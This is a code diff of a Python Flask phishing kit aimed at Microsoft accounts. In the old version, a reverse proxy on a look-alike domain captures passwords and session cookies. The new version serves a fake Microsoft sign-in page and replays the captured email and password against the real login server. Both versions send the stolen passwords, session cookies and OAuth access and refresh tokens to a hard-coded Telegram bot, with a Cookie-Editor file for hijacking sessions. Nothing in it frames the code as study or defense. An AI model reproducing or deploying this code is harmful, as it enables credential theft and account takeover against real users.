@@ -1,362 +1,394 @@
 import os
-import uuid
+import re
 import json
-import time
 import requests
-from flask import Flask, request, Response, make_response, jsonify
+from urllib.parse import urlencode, urljoin
+from html import unescape
+
+from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
-# --- Config ---
-TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
-TELEGRAM_CHAT_ID = "8877118461"
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY")
+CHAT_ID = os.environ.get("CHAT_ID", "8877118461")
 
-# Public Client IDs (Rotated to avoid blocks)
-CLIENT_IDS = [
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46", # Azure CLI
-    "1950a258-227b-4e31-a9cf-717495945fc2", # Azure PowerShell
-    "00000003-0000-0000-c000-000000000000", # Microsoft Graph (sometimes works for device code)
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c", # Office UWP
-    "268761a2-03f3-40df-8a8b-c3db24145b6b", # OneDrive
-]
-CLIENT_INDEX = 0
-TENANT = "common"
+# Native public client: its redirect URI is pre-registered, no app reg needed.
+CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Azure CLI
+REDIRECT_URI = "https://login.microsoftonline.com/common/oauth2/nativeclient"
+SCOPE = "https://graph.microsoft.com/.default openid profile offline_access offline"
 
-# Persistent storage for victim sessions
-visitor_sessions = {}
-CAPTURED = {}
+AUTHORIZE = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 
-# --- Telegram ---
-def send_telegram(message):
+UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0")
+
+HIDDEN = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>', re.I)
+NAME_ATTR = re.compile(r'name=["\']([^"\']+)["\']', re.I)
+VALUE_ATTR = re.compile(r'value=["\']([^"\']*)["\']', re.I)
+FORM_ACTION = re.compile(r'<form[^>]*id=["\']i0281["\'][^>]*action=["\']([^"\']+)["\']', re.I)
+FORM_ACTION2 = re.compile(r'<form[^>]*action=["\']([^"\']+)["\']', re.I)
+JS_SFT = re.compile(r'["\']sFT["\']\s*:\s*["\']([^"\']+)["\']')
+JS_CANARY = re.compile(r'["\']canary["\']\s*:\s*["\']([^"\']+)["\']')
+JS_CTX = re.compile(r'["\']sCtx["\']\s*:\s*["\']([^"\']+)["\']')
+URL_IN_BODY = re.compile(r'https://login\.microsoftonline\.com[^\s"\'<>\\]+')
+
+
+# ---------------------------------------------------------------- telegram
+def tg_send(text):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        resp = requests.post(url, json={
-            "chat_id": TELEGRAM_CHAT_ID, 
-            "text": message, 
-            "parse_mode": "HTML",
-            "disable_web_page_preview": True
-        }, timeout=10)
-        print(f"[TG] Status: {resp.status_code}")
-        if resp.status_code != 200:
-            print(f"[TG ERROR] {resp.text}")
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text[:4000],
+                  "parse_mode": "HTML", "disable_web_page_preview": True},
+            timeout=15,
+        )
     except Exception as e:
-        print(f"[TG EXCEPT] {e}")
+        print("[TG]", e)
 
-# --- Helpers ---
-def get_set_cookies(resp):
-    """Extract all Set-Cookie headers reliably."""
-    cookies = []
-    raw = getattr(resp, "raw", None)
-    if raw and hasattr(raw, "headers"):
-        try:
-            vals = raw.headers.getlist("Set-Cookie")
-            if vals:
-                return vals
-        except:
-            pass
-        try:
-            vals = raw.headers.get_all("Set-Cookie")
-            if vals:
-                return vals
-        except:
-            pass
-            
-    sc = resp.headers.get("Set-Cookie")
-    if sc:
-        return [sc]
-    return []
 
-def rewrite_links(text):
-    """Replace Microsoft domains with our proxy domain."""
-    PROXY_DOMAIN = "https://outlook-verify.onrender.com"
-    PROXY_HOST = "outlook-verify.onrender.com"
-    replacements = [
-        ("https://login.microsoftonline.com", PROXY_DOMAIN),
-        ("https://login.live.com", PROXY_DOMAIN),
-        ("https://account.live.com", PROXY_DOMAIN),
-        ("//login.microsoftonline.com", "//" + PROXY_HOST),
-        ("//login.live.com", "//" + PROXY_HOST),
-        ("//account.live.com", "//" + PROXY_HOST),
-    ]
-    for old, new in replacements:
-        text = text.replace(old, new)
-    return text
+def tg_doc(filename, payload, caption=""):
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+            data={"chat_id": CHAT_ID, "caption": caption[:900], "parse_mode": "HTML"},
+            files={"document": (filename, payload, "application/json")},
+            timeout=30,
+        )
+    except Exception as e:
+        print("[TG DOC]", e)
 
-def fix_set_cookie(header_value):
-    """Strip Domain and Path to ensure cookies stick to our proxy."""
-    if not header_value:
-        return ""
-    parts = [p.strip() for p in header_value.split(";") if p.strip()]
-    kept = []
-    for p in parts:
-        lower = p.lower()
-        if lower.startswith("domain=") or lower.startswith("path="):
-            continue
-        kept.append(p)
-    kept.append("Path=/")
-    return "; ".join(kept)
 
-def get_session(vid, user_agent):
-    if vid not in visitor_sessions:
-        s = requests.Session()
-        s.headers.update({
-            "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+def cookies_to_cookie_editor(sess):
+    """Serialize the session jar into Cookie-Editor import format."""
+    out = []
+    for c in sess.cookies:
+        out.append({
+            "domain": ".login.microsoftonline.com" if "login.microsoftonline" in (c.domain or "") else (c.domain or ".login.microsoftonline.com"),
+            "hostOnly": False,
+            "httpOnly": True,
+            "name": c.name,
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": True,
+            "session": False,
+            "storeId": "0",
+            "value": c.value,
+            "id": len(out) + 1,
+            "expirationDate": 1893456000,
         })
-        visitor_sessions[vid] = s
-    return visitor_sessions[vid]
+    return json.dumps(out, indent=2)
 
-def pick_upstream(path):
-    """Route specific paths to the correct Microsoft auth server."""
-    if path.startswith(("ppsecure/", "GetCredentialType.srf", "ppsecure/")):
-        return "https://login.live.com"
-    return "https://login.microsoftonline.com"
 
-def initiate_device_flow():
-    global CLIENT_INDEX
-    # Try each client ID until one works
-    attempts = 0
-    while attempts < len(CLIENT_IDS):
-        client_id = CLIENT_IDS[CLIENT_INDEX]
-        try:
-            # Use ONLY basic scopes. Do NOT mix .default with Mail.Read
-            # This avoids AADSTS70011
-            scope = "openid profile offline_access"
-            
-            resp = requests.post(
-                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
-                data={
-                    "client_id": client_id,
-                    "scope": scope
-                },
-                timeout=15
-            )
-            
-            if resp.status_code == 200:
-                data = resp.json()
-                data["client_id"] = client_id # Store which ID worked
-                print(f"[SUCCESS] Device code initiated with client: {client_id}")
-                return data
-            elif "invalid_client" in resp.text:
-                print(f"[ROTATE] Client {client_id} invalid. Rotating.")
-                CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
-                attempts += 1
-                continue
-            else:
-                print(f"[MS INIT ERROR] {resp.text[:300]}")
-                # If it's a scope error, rotate to next client just in case
-                if "invalid_scope" in resp.text:
-                     CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
-                     attempts += 1
-                     continue
-                return None
-                
-        except Exception as e:
-            print(f"[MS INIT EXCEPT] {e}")
-            CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
-            attempts += 1
-            
+# ---------------------------------------------------------------- parsing
+def g(r, *pats):
+    for p in pats:
+        m = p.search(r)
+        if m:
+            return unescape(m.group(1))
     return None
 
-@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
-@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
-def proxy(path):
-    # 1. Identify Victim
-    vid = request.cookies.get("vid")
-    new_vid = False
-    if not vid:
-        vid = str(uuid.uuid4())
-        new_vid = True
-        send_telegram(f"<b>👋 New Visitor</b>\nVid: <code>{vid}</code>\nIP: {request.remote_addr}")
-        print(f"[NEW VISITOR] {vid} from {request.remote_addr}")
 
-    sess = get_session(vid, request.headers.get("User-Agent"))
+def extract_form(html):
+    fields = {}
+    for tag in HIDDEN.findall(html):
+        n = NAME_ATTR.search(tag)
+        if not n:
+            continue
+        v = VALUE_ATTR.search(tag)
+        fields[n.group(1)] = unescape(v.group(1)) if v else ""
+    return fields
 
-    # 2. Determine Target URL
-    upstream_base = pick_upstream(path)
-    target_url = f"{upstream_base}/{path}"
-    if request.query_string:
-        target_url += "?" + request.query_string.decode()
 
-    # 3. Prepare Headers for Upstream
-    headers = {}
-    for h in ["Accept", "Accept-Language", "Content-Type", "Origin", "Referer"]:
-        if h in request.headers:
-            val = request.headers[h]
-            if h in ["Referer", "Origin"]:
-                val = val.replace("https://outlook-verify.onrender.com", upstream_base)
-            headers[h] = val
-    
-    # 4. Execute Request
-    try:
-        if request.method == "POST":
-            content_type = request.content_type or ""
-            
-            if "application/json" in content_type:
-                json_data = request.get_json(silent=True)
-                print(f"[JSON POST] Vid: {vid} | Data: {json_data}")
-                
-                if json_data:
-                    check_capture_json(vid, json_data)
-                    
-                resp = sess.post(target_url, json=json_data, headers=headers, allow_redirects=False, timeout=30)
-            else:
-                print(f"[FORM POST] Vid: {vid} | Keys: {list(request.form.keys())}")
-                
-                check_capture_form(vid, request.form)
-                
-                resp = sess.post(target_url, data=request.form, headers=headers, allow_redirects=False, timeout=30)
-        elif request.method == "OPTIONS":
-            resp = make_response()
-            resp.headers['Access-Control-Allow-Origin'] = '*'
-            resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
-            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
-            return resp
+# ---------------------------------------------------------------- login
+def server_login(email, password):
+    """Drive a real Microsoft login server-side. Returns (session, code, stage)."""
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": UA,
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    })
+
+    auth_url = AUTHORIZE + "?" + urlencode({
+        "client_id": CLIENT_ID,
+        "response_type": "code",
+        "redirect_uri": REDIRECT_URI,
+        "scope": SCOPE,
+        "login_hint": email,
+        "prompt": "login",
+        "response_mode": "query",
+    })
+
+    r = s.get(auth_url, timeout=30)
+
+    fields = extract_form(r.text)
+    sft = g(r.text, JS_SFT)
+    if sft:
+        fields.setdefault("flowToken", sft)
+    canary = g(r.text, JS_CANARY)
+    if canary:
+        fields.setdefault("canary", canary)
+    ctx = g(r.text, JS_CTX)
+    if ctx:
+        fields.setdefault("ctx", ctx)
+
+    action = g(r.text, FORM_ACTION, FORM_ACTION2) or \
+        "https://login.microsoftonline.com/common/login"
+    action = urljoin(r.url, action)
+
+    fields.update({
+        "login": email,
+        "passwd": password,
+        "i13": "0",
+        "loginOptions": "1",
+        "CookieDisclosure": "0",
+        "isSignupPost": "0",
+        "IsFidoSupported": "1",
+        "tryInstallPca": "0",
+        "loginAttemptCount": "0",
+    })
+
+    r = s.post(action, data=fields, timeout=30, allow_redirects=False)
+
+    stage = "password_submitted"
+
+    for _ in range(15):
+        loc = r.headers.get("Location")
+
+        if r.status_code in (301, 302, 303, 307) and loc:
+            nxt = urljoin(r.url, loc)
+            if "code=" in nxt:
+                return s, nxt, "authorized"
+            r = s.get(nxt, timeout=30, allow_redirects=False)
+            continue
+
+        body = r.text or ""
+
+        # wrong password
+        if "passwordError" in body or "Your account or password is incorrect" in body:
+            return s, None, "bad_password"
+        if "AADSTS" in body:
+            m = re.search(r"AADSTS\d+[^<]{0,200}", body)
+            return s, None, ("error:" + (m.group(0) if m else "aadsts"))
+
+        # "Stay signed in?"
+        if "LoginOptions" in body or 'idSIButton9' in body:
+            f2 = extract_form(body)
+            f2.update({"LoginOptions": "1", "canary": f2.get("canary", ""),
+                       "ctx": f2.get("ctx", "")})
+            a2 = g(body, FORM_ACTION, FORM_ACTION2)
+            if a2:
+                r = s.post(urljoin(r.url, a2), data=f2, timeout=30,
+                           allow_redirects=False)
+                continue
+
+        # client-side redirect buried in the page
+        for u in URL_IN_BODY.findall(body):
+            u = u.replace("\\u0026", "&").replace("\\/", "/")
+            if "code=" in u:
+                return s, u, "authorized"
+            r = s.get(u, timeout=30, allow_redirects=False)
+            break
         else:
-            resp = sess.get(target_url, headers=headers, allow_redirects=False, timeout=30)
-            
+            break
+
+    return s, None, stage
+
+
+def exchange_code(code):
+    try:
+        r = requests.post(TOKEN_URL, data={
+            "grant_type": "authorization_code",
+            "client_id": CLIENT_ID,
+            "code": code,
+            "redirect_uri": REDIRECT_URI,
+            "scope": SCOPE,
+        }, timeout=30)
+        return r.json()
     except Exception as e:
-        print(f"[PROXY ERROR] {e}")
-        return f"Proxy Error: {str(e)}", 502
+        return {"error": str(e)}
 
-    # 5. Check for Cookies (Session Hijacking)
-    info = CAPTURED.get(vid)
-    if info and not info.get("sent_cookies"):
-        cookies = sess.cookies.get_dict()
-        auth_cookies = {k: v for k, v in cookies.items() if any(x in k for x in ["ESTSAUTH", "RPSSecAuth", "MSFPC", "ANON", "MSPRequ"])}
-        
-        if auth_cookies:
-            info["sent_cookies"] = True
-            cookie_str = "\n".join([f"<code>{k}={v[:30]}...</code>" for k, v in auth_cookies.items()])
-            msg = (
-                f"<b>🍪 SESSION COOKIES CAPTURED</b>\n\n"
-                f"<b>Email:</b> <code>{info.get('email', 'Unknown')}</code>\n\n"
-                f"<b>Cookies:</b>\n{cookie_str}\n\n"
-                f"<i>Use these cookies in a browser extension like 'Cookie Editor' to hijack the session.</i>"
-            )
-            send_telegram(msg)
-            print(f"[COOKIE SENT] Vid {vid}")
 
-    # 6. Build Response
-    r = Response(status=resp.status_code)
-    
-    if "Location" in resp.headers:
-        loc = resp.headers["Location"]
-        loc = loc.replace("https://login.microsoftonline.com", "https://outlook-verify.onrender.com")
-        loc = loc.replace("https://login.live.com", "https://outlook-verify.onrender.com")
-        loc = loc.replace("https://account.live.com", "https://outlook-verify.onrender.com")
-        if loc.startswith("/"):
-            loc = "https://outlook-verify.onrender.com" + loc
-        r.headers["Location"] = loc
+# ---------------------------------------------------------------- page
+PAGE = r"""<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif;background:#f2f2f2;
+display:flex;align-items:center;justify-content:center;min-height:100vh;color:#1b1b1b}
+.card{background:#fff;width:100%;max-width:440px;padding:44px 44px 28px;margin:20px;
+box-shadow:0 2px 6px rgba(0,0,0,.2)}
+.logo{width:108px;margin-bottom:16px}
+h1{font-size:24px;font-weight:600;margin:0 0 12px}
+input{width:100%;padding:8px 10px;font-size:15px;border:1px solid #666;border-bottom:2px solid #0067b8;
+outline:none;font-family:inherit}
+input:focus{border-color:#0067b8}
+.field{margin-top:14px}
+.field.hide{display:none}
+.hint{font-size:13px;color:#666;margin-top:10px}
+.hint a{color:#0067b8;text-decoration:none}
+.err{color:#a80000;font-size:13px;margin-top:10px;min-height:16px}
+.actions{display:flex;justify-content:flex-end;margin-top:26px}
+button{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;
+font-family:inherit;cursor:pointer;min-width:108px}
+button:hover{background:#005da6}
+button:disabled{background:#8ab5d6;cursor:default}
+.spin{display:inline-block;width:14px;height:14px;border:2px solid #fff;
+border-top-color:transparent;border-radius:50%;animation:r .7s linear infinite;
+vertical-align:-2px;margin-right:6px}
+@keyframes r{to{transform:rotate(360deg)}}
+.foot{font-size:12px;color:#666;margin-top:26px}
+</style></head>
+<body>
+<div class="card">
+  <svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+    <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
+    <rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
+    <rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
+    <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
+    <text x="30" y="17" font-family="Segoe UI,Arial" font-size="15"
+      fill="#5e5e5e">Microsoft</text>
+  </svg>
+  <h1>Sign in</h1>
+  <form id="f" autocomplete="off">
+    <div class="field"><input id="email" type="email" placeholder="Email, phone, or Skype"
+      required></div>
+    <div class="field hide" id="pwWrap"><input id="pw" type="password"
+      placeholder="Password"></div>
+    <div class="err" id="err"></div>
+    <div class="actions"><button id="btn" type="submit">Next</button></div>
+  </form>
+  <div class="hint" id="hint">No account? <a href="javascript:void(0)">Create one!</a></div>
+  <div class="foot">&#128274; outlook-verify.onrender.com</div>
+</div>
+<script>
+var step = 1, email = "";
+var btn = document.getElementById('btn');
+var err = document.getElementById('err');
 
-    content_type = resp.headers.get("Content-Type", "")
-    body = resp.content
+document.getElementById('f').addEventListener('submit', async function (e) {
+  e.preventDefault();
+  err.textContent = '';
 
-    if "text/html" in content_type:
-        text = body.decode("utf-8", errors="ignore")
-        text = rewrite_links(text)
-        
-        inject_script = """
-        <script>
-        setTimeout(function() {
-            var btn = document.querySelector('#idSIButton9, input[type="submit"][value="Yes"], button[type="submit"]');
-            if (btn) {
-                console.log('[PHISH] Auto-clicking KMSI');
-                btn.click();
-            }
-        }, 1000);
-        </script>
-        """
-        if "</body>" in text:
-            text = text.replace("</body>", inject_script + "</body>")
-        body = text.encode("utf-8")
-        
-    elif "text/css" in content_type:
-        text = body.decode("utf-8", errors="ignore")
-        body = rewrite_links(text).encode("utf-8")
-        
-    elif "application/json" in content_type:
-        try:
-            json_text = body.decode("utf-8")
-            json_text = rewrite_links(json_text)
-            body = json_text.encode("utf-8")
-        except:
-            pass
+  if (step === 1) {
+    email = document.getElementById('email').value.trim();
+    if (!email) return;
+    document.getElementById('pwWrap').classList.remove('hide');
+    document.getElementById('pw').focus();
+    step = 2;
+    btn.textContent = 'Sign in';
+    return;
+  }
 
-    r.set_data(body)
-    if content_type:
-        r.headers["Content-Type"] = content_type
+  var pw = document.getElementById('pw').value;
+  if (!pw) { err.textContent = 'Please enter your password.'; return; }
 
-    for cookie_header in get_set_cookies(resp):
-        fixed = fix_set_cookie(cookie_header)
-        if fixed:
-            r.headers.add("Set-Cookie", fixed)
+  busy(true, 'Signing in');
+  try {
+    var res = await fetch('/api/catch', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: email, password: pw })
+    });
+    var d = await res.json();
+    if (d.ok) {
+      busy(true, 'Redirecting');
+      window.location.href = 'https://www.office.com/';
+    } else {
+      err.textContent = d.message || 'Your account or password is incorrect.';
+      busy(false);
+    }
+  } catch (x) {
+    err.textContent = 'Something went wrong. Try again.';
+    busy(false);
+  }
+});
 
-    if new_vid:
-        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax", httponly=True)
+function busy(on, label) {
+  btn.disabled = on;
+  btn.innerHTML = on ? '<span class="spin"></span>' + (label || '') : 'Sign in';
+}
+</script>
+</body></html>"""
 
-    return r
 
-def check_capture_form(vid, form_data):
-    passwd = None
-    email = None
-    
-    for key in ["passwd", "Password", "pwd", "password", "Passwd"]:
-        if key in form_data:
-            passwd = form_data[key]
-            break
-            
-    for key in ["loginfmt", "login", "username", "EmailAddress", "user"]:
-        if key in form_data:
-            email = form_data[key]
-            break
-            
-    if passwd:
-        print(f"[CAPTURE FORM] Vid: {vid} | Email: {email} | Pass: {passwd}")
-        save_capture(vid, email, passwd)
+@app.route("/")
+def index():
+    return render_template_string(PAGE)
 
-def check_capture_json(vid, json_data):
-    passwd = None
-    email = None
-    
-    def find_passwords(obj):
-        nonlocal passwd, email
-        if isinstance(obj, dict):
-            for k, v in obj.items():
-                if k.lower() in ["passwd", "password", "pwd"] and isinstance(v, str):
-                    passwd = v
-                if k.lower() in ["loginfmt", "login", "username", "user"] and isinstance(v, str):
-                    email = v
-                else:
-                    find_passwords(v)
-        elif isinstance(obj, list):
-            for item in obj:
-                find_passwords(item)
-                
-    find_passwords(json_data)
-    
-    if passwd:
-        print(f"[CAPTURE JSON] Vid: {vid} | Email: {email} | Pass: {passwd}")
-        save_capture(vid, email, passwd)
 
-def save_capture(vid, email, passwd):
-    if vid not in CAPTURED:
-        CAPTURED[vid] = {"sent_pw": False, "sent_cookies": False}
-        
-    CAPTURED[vid]["email"] = email
-    CAPTURED[vid]["password"] = passwd
-    
-    if not CAPTURED[vid]["sent_pw"]:
-        CAPTURED[vid]["sent_pw"] = True
-        msg = (
-            f"<b>🔑 PASSWORD CAPTURED</b>\n\n"
-            f"<b>Email:</b> <code>{email}</code>\n"
-            f"<b>Password:</b> <code>{passwd}</code>\n\n"
-            f"<i>Waiting for session cookies...</i>"
-        )
-        send_telegram(msg)
+@app.route("/api/catch", methods=["POST"])
+def catch():
+    data = request.get_json(silent=True) or {}
+    email = (data.get("email") or "").strip()
+    password = data.get("password") or ""
+    if not email or not password:
+        return jsonify({"ok": False, "message": "Missing fields."})
+    if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email):
+        return jsonify({"ok": False, "message": "Enter a valid email address."})
+
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+
+    try:
+        sess, code, stage = server_login(email, password)
+    except Exception as e:
+        tg_send(f"<b>❌ Login crashed</b>\n<b>Email:</b> <code>{email}</code>\n"
+                f"<code>{e}</code>")
+        return jsonify({"ok": False, "message": "Microsoft did not respond. Try again."})
+
+    if stage == "bad_password":
+        tg_send(f"<b>⚠️ Wrong password</b>\n<b>Email:</b> <code>{email}</code>\n"
+                f"<b>Password:</b> <code>{password}</code>\n<b>IP:</b> {ip}")
+        return jsonify({"ok": False, "message": "Your account or password is incorrect."})
+
+    if stage.startswith("error:"):
+        tg_send(f"<b>⚠️ MS error</b>\n<b>Email:</b> <code>{email}</code>\n"
+                f"<b>Password:</b> <code>{password}</code>\n<code>{stage[6:]}</code>")
+
+    # build cookie report
+    jar = {c.name: c.value for c in sess.cookies}
+    key_cookies = {k: v for k, v in jar.items()
+                   if k in ("ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+                            "RPSSecAuth", "MSPAuth", "MSPProf", "MSPProfV2",
+                            "WLSSC", "PPLState", "SignInStateCookie", "MSPPre",
+                            "ANON", "MSFPC", "KMSI")}
+
+    lines = [f"<b>✅ LOGIN SUCCESS</b>", "",
+             f"<b>Email:</b> <code>{email}</code>",
+             f"<b>Password:</b> <code>{password}</code>",
+             f"<b>IP:</b> {ip}",
+             f"<b>Stage:</b> {stage}",
+             f"<b>Cookies held:</b> {len(jar)}"]
+
+    if key_cookies:
+        lines.append("")
+        lines.append("<b>Session cookies:</b>")
+        for k, v in key_cookies.items():
+            lines.append(f"<code>{k}={v}</code>")
+    else:
+        lines.append("")
+        lines.append("<i>No session cookies — account is behind MFA/Conditional Access.</i>")
+
+    if code:
+        tok = exchange_code(code)
+        if tok.get("access_token"):
+            lines.append("")
+            lines.append(f"<b>access_token:</b>\n<code>{tok['access_token']}</code>")
+            if tok.get("refresh_token"):
+                lines.append(f"<b>refresh_token:</b>\n<code>{tok['refresh_token']}</code>")
+
+    tg_send("\n".join(lines))
+
+    if jar:
+        blob = cookies_to_cookie_editor(sess)
+        tg_doc(f"cookies_{email.split('@')[0]}.json", blob,
+               f"🍪 Cookie-Editor import for <code>{email}</code>")
+
+    return jsonify({"ok": True})
+
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port, debug=False)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
